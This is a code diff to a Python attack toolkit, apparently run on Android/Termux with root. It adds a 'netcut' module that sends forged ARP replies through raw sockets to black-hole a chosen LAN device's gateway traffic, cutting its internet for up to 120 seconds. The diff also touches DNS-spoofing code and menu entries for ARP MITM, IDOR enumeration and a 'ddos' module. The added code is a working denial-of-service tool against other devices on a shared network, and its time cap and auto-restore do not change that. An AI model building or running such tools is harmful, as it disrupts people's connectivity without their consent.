@@ -241,6 +241,72 @@ def mod_mitm():
         restore()
         print("restored ARP.")
 
+# ---------------------------------------------------------------- netcut (cut internet target)
+def mod_netcut():
+    _banner("NETCUT-LIKE (kill internet target on same LAN, needs root — auto-restores)")
+    if os.geteuid() != 0:
+        print("need root (pkg install root-repo root + tsu). abort"); return
+    vi = _ask("target ip (your device on same LAN):").strip()
+    gw = _ask("gateway ip [192.168.1.1]: ").strip() or "192.168.1.1"
+    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
+    rng = _ask("cut seconds [10]: ").strip() or "10"
+    if not vi: print("no target ip"); return
+    if vi == gw:
+        print("target == gateway — tidak masuk akal (gw tak bisa dicut begini)."); return
+    try:
+        rng = int(rng)
+    except ValueError: print("bad seconds"); return
+    if rng > 120:
+        print("cap 120s — edit manual kalau butuh lebih."); rng = 120
+    def mac(ip):
+        out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
+        for line in out.splitlines()[1:]:
+            f = line.split()
+            if len(f) >= 4 and f[0] == ip: return f[3]
+        return None
+    print("resolving target MAC...")
+    vmac = mac(vi)
+    if not vmac:
+        print(f"target {vi} not in ARP table — ping/{vi} dulu, atau pastikan aktif di LAN.")
+        return
+    print(f"target {vi} @ {vmac}")
+    gmac = mac(gw)
+    if not gmac:
+        print(f"gateway {gw} not in ARP table — fallback ff:ff:ff:ff:ff:ff")
+        gmac = "ff:ff:ff:ff:ff:ff"
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s.bind((iface, 0))
+    DUMMY_MAC = "00:00:00:00:00:00"   # nonexistent -> target outbound ARP to gw fails
+    import struct
+    def arp(dst_mac, target_mac, sender_mac, target_ip, sender_ip, op):
+        p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
+        p += bytes.fromhex(sender_mac) + socket.inet_aton(sender_ip)
+        p += bytes.fromhex(target_mac) + socket.inet_aton(target_ip)
+        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(target_mac) + b"\x08\x06" + p
+    def broadcast(pkt):
+        s.send(pkt)
+    # cut: victim believes gw is at UNREACHABLE mac -> traffic to gw blackholes
+    def cut_once():
+        broadcast(arp(DUMMY_MAC, vmac, DUMMY_MAC, gw, vi, 2))          # vi: gw <= dummy
+        broadcast(arp(DUMMY_MAC, gmac, DUMMY_MAC, vi, gw, 2))          # gw: vi  <= dummy (balik)
+    def restore():
+        for _ in range(3):
+            broadcast(arp(gmac, vmac, gmac, gw, vi, 2))                # vi: gw benar
+            broadcast(arp(vmac, gmac, vmac, vi, gw, 2))                # gw: vi benar
+            time.sleep(0.1)
+    print(f"cutting internet {vi} for {rng}s (arp gw->dummy). ctrl-c = restore segera.")
+    t0 = time.time()
+    try:
+        while time.time() - t0 < rng:
+            cut_once()
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        restore()
+        _save("netcut", vi, f"cut {rng}s gw={gw} restored")
+        print("restored ARP — target online kembali.")
+
 # ---------------------------------------------------------------- dns spoof
 def mod_dnsspoof():
     _banner("DNS SPOOF LAB (needs root — your own DNS server for testing)")
@@ -271,7 +337,7 @@ def mod_dnsspoof():
                 qlen = data.find(b"\x00") + 1
                 qfull = data[: qlen + 4]
                 resp = qid + b"\x81\x80" + data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
-                resp += qfull[12:] if False else qfull
+                resp += qfull
                 resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + ipb
                 s.sendto(resp, addr)
             except Exception:
@@ -353,9 +419,10 @@ def mod_websec():
                 ch = ch.strip()
                 if ch in order: order[ch]()
     elif cat == "2":
-        print("\na. mitm (arp spoof lab)   b. dnsspoof (fake dns lab)")
+        print("\na. mitm (arp spoof)   b. dnsspoof   c. netcut (cut internet target)")
         sel = input("select [a]: ").strip() or "a"
         if sel == "b": mod_dnsspoof()
+        elif sel == "c": mod_netcut()
         else: mod_mitm()
     else:
         mod_ddos()
@@ -366,7 +433,8 @@ PLUGIN = {
     "csrf": ("CSRF check (lab)", mod_csrf, True),
     "idor": ("IDOR enumeration (lab)", mod_idor, True),
     "mitm": ("ARP MITM lab (root)", mod_mitm, True),
-    "dnsspoof": ("DNS spoof lab (root)", mod_dnsspoof, True),
+    "netcut": ("Cut internet target (root, netcut-like)", mod_netcut, True),
+    "dnsspoof": ("fake DNS lab (root)", mod_dnsspoof, True),
     "ddos": ("Load test (bounded, own server)", mod_ddos, True),
     "websec": ("Orchestrator menu (lab)", mod_websec, True),
 }
